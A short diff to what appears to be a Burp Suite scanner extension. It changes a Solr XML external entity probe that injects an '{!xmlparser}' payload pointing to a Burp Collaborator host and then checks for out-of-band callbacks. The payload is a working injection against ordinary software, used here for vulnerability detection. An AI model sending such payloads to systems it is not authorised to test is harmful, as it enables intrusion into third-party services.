@@ -379,7 +379,7 @@ class SuspectTransform(IScannerCheck):
 class Solr(IScannerCheck):
     def doActiveScan(self, basePair, insertionPoint):
         collab = callbacks.createBurpCollaboratorClientContext()
-        obfuscated_payload = "{!xmlparser v='<!DOCTYPE a SYSTEM \"http://"+collab.generatePayload(True).replace(".", "&#x2e;")+"/\"><a></a>'}"
+        obfuscated_payload = "{!xmlparser v='<!DOCTYPE a SYSTEM \"http://"+collab.generatePayload(True)+"/xxe\"><a></a>'}"
         attack = request(basePair, insertionPoint, obfuscated_payload)
         interactions = collab.fetchAllCollaboratorInteractions()
         if interactions:
